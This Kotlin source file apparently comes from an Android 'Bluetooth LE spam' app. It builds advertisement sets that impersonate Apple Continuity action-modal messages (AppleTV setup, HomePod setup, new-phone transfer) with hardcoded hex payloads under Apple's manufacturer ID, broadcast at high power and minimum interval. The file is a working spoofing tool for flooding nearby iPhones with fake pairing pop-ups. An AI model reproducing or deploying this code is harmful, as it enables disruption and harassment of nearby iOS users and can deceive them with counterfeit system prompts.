package de.simon.dankelmann.bluetoothlespam.AdvertisementSetGenerators

import android.bluetooth.BluetoothDevice
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.AdvertisingSetParameters
import android.util.Log
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingSetCallback
import de.simon.dankelmann.bluetoothlespam.Callbacks.GenericAdvertisingCallback
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertiseMode
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetRange
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementSetType
import de.simon.dankelmann.bluetoothlespam.Enums.AdvertisementTarget
import de.simon.dankelmann.bluetoothlespam.Enums.PrimaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.SecondaryPhy
import de.simon.dankelmann.bluetoothlespam.Enums.TxPowerLevel
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
import de.simon.dankelmann.bluetoothlespam.Models.ManufacturerSpecificData

class ContinuityActionModalAdvertisementSetGenerator: IAdvertisementSetGenerator {

    private val _logTag = "ContinuityActionModalAdvertisementSetGenerator"

    // Device Data taken from here:
    // https://www.mobile-hacker.com/2023/09/07/spoof-ios-devices-with-bluetooth-pairing-messages-using-android/

    val _deviceData = mapOf(
        "AppleTV Setup" to "04042a0000000f05c101604c95000010000000",
        "AppleTV Pair" to "04042a0000000f05c106604c95000010000000",
        "AppleTV New User" to "04042a0000000f05c120604c95000010000000",
        "AppleTV AppleID Setup" to "04042a0000000f05c12b604c95000010000000",
        "AppleTV Wireless Audio Sync" to "04042a0000000f05c1c0604c95000010000000",
        "AppleTV Homekit Setup" to "04042a0000000f05c10d604c95000010000000",
        "AppleTV Keyboard" to "04042a0000000f05c113604c95000010000000",
        "AppleTV ‘Connecting to Network’" to "04042a0000000f05c127604c95000010000000",
        "Homepod Setup" to "04042a0000000f05c10b604c95000010000000",
        "Setup New Phone" to "04042a0000000f05c109604c95000010000000",
        "Transfer Number to New Phone" to "04042a0000000f05c102604c95000010000000",
        "TV Color Balance" to "04042a0000000f05c11e604c95000010000000"
    )

    private val _manufacturerId = 76 // 0x004c == 76 = Apple
    override fun getAdvertisementSets(): List<AdvertisementSet> {
        var advertisementSets: MutableList<AdvertisementSet> = mutableListOf()

        _deviceData.map { deviceData ->

            var advertisementSet: AdvertisementSet = AdvertisementSet()
            advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_IOS
            advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_CONTINUITY_ACTION_MODALS
            advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_FAR

            // Advertise Settings
            advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
            advertisementSet.advertiseSettings.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertiseSettings.connectable = false
            advertisementSet.advertiseSettings.timeout = 0

            // Advertising Parameters
            advertisementSet.advertisingSetParameters.legacyMode = true
            advertisementSet.advertisingSetParameters.interval = AdvertisingSetParameters.INTERVAL_MIN
            advertisementSet.advertisingSetParameters.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertisingSetParameters.primaryPhy = PrimaryPhy.PHY_LE_1M
            advertisementSet.advertisingSetParameters.secondaryPhy = SecondaryPhy.PHY_LE_1M

            // AdvertiseData
            advertisementSet.advertiseData.includeDeviceName = false

            val manufacturerSpecificData = ManufacturerSpecificData()
            manufacturerSpecificData.manufacturerId = _manufacturerId
            manufacturerSpecificData.manufacturerSpecificData =
                StringHelpers.decodeHex(deviceData.value)

            Log.d(
                _logTag,
                "Created Bytearray with ${manufacturerSpecificData.manufacturerSpecificData.size} Bytes"
            )

            advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)
            advertisementSet.advertiseData.includeTxPower = false

            // Scan Response
            //advertisementSet.scanResponse.includeTxPower = false

            // General Data
            advertisementSet.title = deviceData.key

            // Callbacks
            advertisementSet.advertisingSetCallback = GenericAdvertisingSetCallback()
            advertisementSet.advertisingCallback = GenericAdvertisingCallback()

            advertisementSets.add(advertisementSet)
        }

        return advertisementSets.toList()
    }
}